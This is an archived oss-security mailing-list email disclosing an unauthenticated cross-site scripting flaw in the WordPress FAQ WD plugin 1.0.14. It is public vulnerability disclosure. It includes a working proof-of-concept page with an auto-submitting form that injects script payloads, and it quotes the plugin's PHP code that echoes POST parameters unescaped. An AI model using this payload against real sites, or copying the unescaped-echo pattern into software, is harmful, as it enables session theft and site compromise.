X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1992" "Saturday" "16" "April" "2016" "14:01:20" "+0530" "shravan kumar" "cor3sm4sh3r@gmail.com" "<CAOmn9FRZhAZDacr=szRqSYdxD5R_c_FinN=Zg6wdehO2M+qTzQ@mail.gmail.com>" "74" "[oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14." nil nil nil "4" "2016041608:31:20" "[oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14." (number mark "U       cor3sm4sh3r@ Apr 16   74/1992  " thread-indent "\"[oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28132 invoked by uid 550); 16 Apr 2016 09:26:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 6083 invoked from network); 16 Apr 2016 08:31:32 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to;
        bh=Zg5/rIMeAOUVUvlDHBr5sLFXhYLB+1MfndRHE/UTZy4=;
        b=n/vOBJRf1w/lzvebczoIDRILerAc5ktBo3Cv4E4fGZiRb2YOmkVeGAdgU3Kx8cbdR+
         2ro4hwkrsHqhbfU1mDfa/0n5UtbI/SXGZAq+eGfYYd5OYJ/cByQ5E2VsrZc6r+YiWk7z
         ZITmvL8AeUZufrsRGcu6pTPs3wYonH6Prd9Tc3cjZevpg3WFgACE3FVcGXHexWcNmqgc
         NZFZnSlIGV/HQFGKYc3n0FMZakeS1zbwQKglamsTBtRLNivxmVlneYvgdbo316XHp9nc
         7blO1KzgJuR78eN/OKzEsql9Cyat1E3s3u8jFdpdJSJVtGVU9qwEGkLr2WTqD0613O+8
         VPMQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to;
        bh=Zg5/rIMeAOUVUvlDHBr5sLFXhYLB+1MfndRHE/UTZy4=;
        b=ZkwsHa3QakLnaO2NwRC5Y3TLXUJ0rQGJUeOL7ls4bSDwka8JdquzGubNfCZvo/lV5D
         Rxp5+kxig+rYFtM9oW37VjxGvA8YM/Hj65dybtXazh5sZLeaIJfMoLCH0/JX9n4wkgAS
         gFdgGu6cKfM46ivgfx09YEmVfKdLhv3ltup/rpdnA5CFBdQr/KZcEPncTQDQu+PhmHJ+
         KDwBu1QbOb7e0r/8vvImAMcFJd3vmqH7MItEEEY+kCZopMFUS/gNGPiCkKuBqo72+odQ
         UgbTlvLEQzqEVQpRdhh/ZOO9PQ7frq55ItlM/oBvbkGc2D0peAkuquyqz0j+jD8eMScQ
         PDug==
X-Gm-Message-State: AOPr4FUlaHP4ipec86Iie7WXHZnY3nVZvgNNOZTCjmDJULKsfeG69HIojvvjfXfQQ1aA6hKxyOOcTzW3LYdBCQ==
MIME-Version: 1.0
X-Received: by 10.107.140.202 with SMTP id o193mr27482483iod.161.1460795480988;
 Sat, 16 Apr 2016 01:31:20 -0700 (PDT)
Date: Sat, 16 Apr 2016 14:01:20 +0530
Message-ID: <CAOmn9FRZhAZDacr=szRqSYdxD5R_c_FinN=Zg6wdehO2M+qTzQ@mail.gmail.com>
From: shravan kumar <cor3sm4sh3r@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=94eb2c060bfebbe42e053095f3fe
Subject: [oss-security] Unauthenticated XSS Vulnerability in WORDPRESS FAQ WD plugin 1.0.14.

--94eb2c060bfebbe42e053095f3fe
Content-Type: text/plain; charset=UTF-8

Hello,

I would like to report a Unauthenticated XSS vulnerability in FAQ WD
 plugin version 1.0.14 .

The Plugin can be found at https://wordpress.org/plugins/faq-wd/

This Bug can be triggered by unauthenticated / Authenticated user. If a
user is sent a URL by social engineering and the user clicks the link the
bug can be triggred.

The URL should be something like this

http://attackerssite.com/XSS_POC.html



The code for XSS_POC.html is as follows:


<html>
  <body onload="document.forms['xss'].submit()" >
    <form name="xss" action="
http://targetsite/wpinstallation/wp-content/plugins/faq-wd/lang/views/SLangViewPo.php"
method="POST" >

  <input type="hidden" name="lang_err_mess" value="
<script>alert(1);</script>" />
<input type="hidden" name="lang_success_synchron" value="
<script>alert(2);</script>" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>


Techinical Details:

The vulnerable page is

wp-content/plugins/faq-wd/lang/views/SLangViewPo.php

This page can be directly accessed by anyone.

The Code responsible for the vulnerability :
<?php if (isset($_POST['lang_err_mess'])): ?>
    <div class="error" style="display: inline-block;width: 100%"><p><?php
echo $_POST['lang_err_mess']; ?></p></div>
<?php elseif (isset($_POST['lang_success'])): ?>
    <div class="updated" style="display: inline-block;width: 100%"><p><?php
echo 'File was successfully updated.'; ?></p></div>
<?php endif; ?>
<?php if (isset($_POST['lang_success_synchron'])): ?>
    <div class="updated" style="display: inline-block;width: 100%"><p><?php
echo $_POST['lang_success_synchron']; ?></p></div>
<?php endif; ?>


Here we can see that there are two post request which are displayed in
unsafe manner while rendering the page.

The vulnerable POST parameters are:

   - $_POST['lang_err_mess']
   - $_POST['lang_success_synchron']


-- 
Shravan Kumar

--94eb2c060bfebbe42e053095f3fe--
